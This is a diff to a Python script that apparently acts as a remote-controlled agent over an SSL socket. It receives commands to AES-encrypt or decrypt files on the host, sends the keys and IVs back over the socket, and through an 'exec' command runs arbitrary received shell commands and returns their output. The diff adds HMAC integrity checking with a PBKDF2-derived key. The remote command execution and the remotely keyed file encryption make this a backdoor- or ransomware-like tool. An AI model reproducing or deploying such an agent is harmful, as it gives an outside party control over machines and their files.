@@ -57,9 +57,12 @@ def RecvData():
     temp = ssl_sock.read()
     return temp
 
-def Encrypt(fileToProtect, cipher):
+def DKey(primitiveKey, salt):
+    dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
+    return dk
+
+def Encrypt(fileToProtect, cipher, key, IV):
     try:
-        hasher = hashlib.sha256()
         with open(fileToProtect, 'rb') as inFile, open(fileToProtect + '.enc', 'wa') as outFile:
             clearData = inFile.read()
             cryptData = cipher.encrypt(encoder.encode(clearData))
@@ -69,7 +72,8 @@ def Encrypt(fileToProtect, cipher):
         SendData('############################ Encrption Success')
         SendData('--> original file: ' + str(fileToProtect))
         SendData('--> protected file: ' + str(fileToProtect) + '.enc')
-        SendData('HEX: ' + str(CheckHash(fileToProtect + '.enc')))
+        SendData('HEX: ' + str(CheckHash(fileToProtect + '.enc', key, IV)))
+        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
         SendData('----------------------------------------------')
         SendData('END')
     except:
@@ -83,10 +87,10 @@ def Encrypt(fileToProtect, cipher):
             SendData('----------------------------------------------')
             SendData('END')
 
-def Decrypt(fileProtected, cipher, digest):
+def Decrypt(fileProtected, cipher, digest, key, IV):
     fileToDeProtect = fileProtected.split('.')[0] + "." + fileProtected.split('.')[1] + ".dec"
     try:
-        if hmac.compare_digest(CheckHash(fileProtected), digest) == True:
+        if hmac.compare_digest(CheckHash(fileProtected, key, IV), digest) == True:
             with open(fileProtected, 'rb') as inFile, open(fileToDeProtect, 'wa') as outFile:
                 cryptData = inFile.read()
                 clearData = cipher.decrypt(cryptData)
@@ -99,6 +103,7 @@ def Decrypt(fileProtected, cipher, digest):
         SendData('############################ Decrption Success')
         SendData('--> original file: ' + fileProtected)
         SendData('--> protected file: ' + fileToDeProtect)
+        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
         SendData('HASH: Verified')
         SendData('----------------------------------------------')
         SendData('END')
@@ -116,8 +121,8 @@ def Decrypt(fileProtected, cipher, digest):
             SendData('----------------------------------------------')
             SendData('END')
 
-def CheckHash(fileName):
-    hasher = hashlib.sha256()
+def CheckHash(fileName, key, IV):
+    hasher = hmac.new(DKey(key, IV),'',hashlib.sha256)
     with open(fileName, 'rb') as inFile:
         buf = inFile.read(2048)
         hasher.update(buf)
@@ -192,14 +197,14 @@ while 1:
             SendData('IV: ' + base64.b64encode(IV))
             SendData('key: '+ base64.b64encode(key))
             cipher = AES.new(key, AES.MODE_CBC, IV)
-            Encrypt(fileToProtect, cipher)
+            Encrypt(fileToProtect, cipher, key, IV)
         elif inText.split(':')[1] == 'dec':
             fileToDeProtect = inText.split(':')[2]
             IV = base64.b64decode(inText.split(':')[3])
             key = base64.b64decode(inText.split(':')[4])
             HEX = inText.split(':')[5]
             cipher = AES.new(key, AES.MODE_CBC, IV)
-            Decrypt(fileToDeProtect, cipher, HEX)
+            Decrypt(fileToDeProtect, cipher, HEX, key, IV)
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
